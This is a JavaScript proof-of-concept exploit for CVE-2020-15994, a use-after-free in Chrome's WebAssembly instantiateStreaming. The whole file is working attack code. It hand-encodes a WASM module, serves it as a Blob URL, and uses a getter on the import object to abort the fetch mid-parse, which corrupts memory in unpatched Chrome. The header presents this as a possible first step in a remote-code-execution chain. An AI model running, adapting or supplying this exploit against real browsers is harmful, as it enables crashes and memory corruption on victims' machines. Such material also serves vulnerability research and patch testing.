/*
 * Exploit Title : CVE-2020-15994 – Chrome WebAssembly instantiateStreaming Use-After-Free
 * Target Browser: Chrome versions prior to 85.0.4183.121
 * Vulnerability : Triggers a use-after-free via a timing issue between fetch abortion and WebAssembly instantiation.
 * Technique      : Aborts a streaming WASM fetch mid-parse via a dynamic importObject getter.
 * Outcome        : Memory corruption and crash, potential basis for RCE chain.
 */

// --------------------------------------------------------------------------------------
// Converts a typed array containing WebAssembly bytecode into a Blob URL that simulates
// a real .wasm file served over HTTP. Chrome will treat this as a valid WASM streaming
// source during `instantiateStreaming()`.
// --------------------------------------------------------------------------------------
function typedArrayToURL(typedArray, mimeType) {
  return URL.createObjectURL(new Blob([typedArray.buffer], { type: mimeType }));
}

// --------------------------------------------------------------------------------------
// Minimal, syntactically valid WASM binary encoded as a Uint8Array. It doesn't perform
// any real logic—it simply provides enough structure for the WASM parser to start decoding.
// --------------------------------------------------------------------------------------
const wasmCode_Info = new Uint8Array([
  0x00, 0x61, 0x73, 0x6D,                         // WASM magic number
  0x01, 0x00, 0x00, 0x00,                         // WASM version (1.0)
  // Type section, import section, function declarations...
  0x01, 0x0E, 0x03, 0x60, 0x01, 0x7F, 0x00, 0x60,
  0x00, 0x00, 0x60, 0x03, 0x7F, 0x7F, 0x7F, 0x00,
  0x02, 0x25, 0x02, 0x04, 0x65, 0x6E, 0x76, 0x31,
  0x0B, 0x4A, 0x73, 0x46, 0x75, 0x6E, 0x63, 0x74,
  0x69, 0x6F, 0x6E, 0x31, 0x00, 0x00, 0x03, 0x65,
  0x6E, 0x76, 0x0A, 0x4A, 0x73, 0x46, 0x75, 0x6E,
  0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0x03,
  0x03, 0x02, 0x01, 0x02, 0x05, 0x06, 0x01, 0x01,
  0x80, 0x02, 0x80, 0x02, 0x07, 0x22, 0x03, 0x06,
  0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x02, 0x00,
  0x0C, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52,
  0x65, 0x63, 0x6F, 0x72, 0x64, 0x00, 0x03, 0x06,
  0x5F, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x02,
  0x0A, 0x10, 0x02, 0x03, 0x00, 0x01, 0x0B, 0x0A,
  0x00, 0x41, 0x00, 0x10, 0x01, 0x41, 0x00, 0x10,
  0x00, 0x0B, 0x0B, 0x0A, 0x01, 0x00, 0x41, 0x80,
  0x0C, 0x0B, 0x03, 0xA0, 0x06, 0x50
]);

// --------------------------------------------------------------------------------------
// Setup an AbortController that allows aborting the streaming fetch request at a very
// specific moment: after the WebAssembly engine begins instantiation but before parsing
// has completed. This is key to triggering the race condition in Chrome.
// --------------------------------------------------------------------------------------
const controller = new AbortController();
const signal = controller.signal;

// --------------------------------------------------------------------------------------
// This is a visible user-land marker. Helps show that the PoC has begun execution.
// --------------------------------------------------------------------------------------
alert("Exploit!");

// --------------------------------------------------------------------------------------
// Define an importObject normally used to provide environment functions to WASM modules.
// Chrome's internal instantiateStreaming logic will access importObject.env during parsing.
// --------------------------------------------------------------------------------------
let importObject = {
  env:  { JsFunction: num => console.log("[env] Log:", num) },
  env1: { JsFunction1: num => console.log("[env1] Log:", num) }
};

// --------------------------------------------------------------------------------------
// This is the vulnerability trigger: defining a dynamic getter for 'env'. When Chrome’s
// WebAssembly engine attempts to access `importObject.env`, it will trigger this function
// instead of returning a static object.
//
// Inside the getter, the fetch signal is aborted, which causes the request to terminate
// prematurely. However, at this point the engine may already be relying on memory tied
// to the fetch stream. The deallocation of that memory causes a use-after-free once the
// engine continues with instantiation after an unexpected fetch cancellation.
// --------------------------------------------------------------------------------------
importObject.__defineGetter__('env', function () {
  console.log("[exploit] 'env' accessed — initiating fetch abort");
  controller.abort();  // Boom: abort mid-parsing = use-after-free in vulnerable Chrome
  return {
    JsFunction: num => console.log("[env::fallback] Called with:", num)
  };
});

// --------------------------------------------------------------------------------------
// Begin actual WASM instantiation using the Blob URL we generated earlier. This will:
// - Trigger the fetch of the fake WASM module
// - Cause the engine to access importObject.env → our getter triggers
// - AbortController cancels the stream during active parsing
// - Chrome continues parsing → use-after-free
// --------------------------------------------------------------------------------------
WebAssembly.instantiateStreaming(
  fetch(typedArrayToURL(wasmCode_Info, 'application/wasm'), { signal }),
  importObject
).then(function (obj) {
  console.log("[exploit] Instantiation success? Unexpected.");
}).catch(function (err) {
  console.log("[exploit] Instantiation failed (expected):", err.message);
});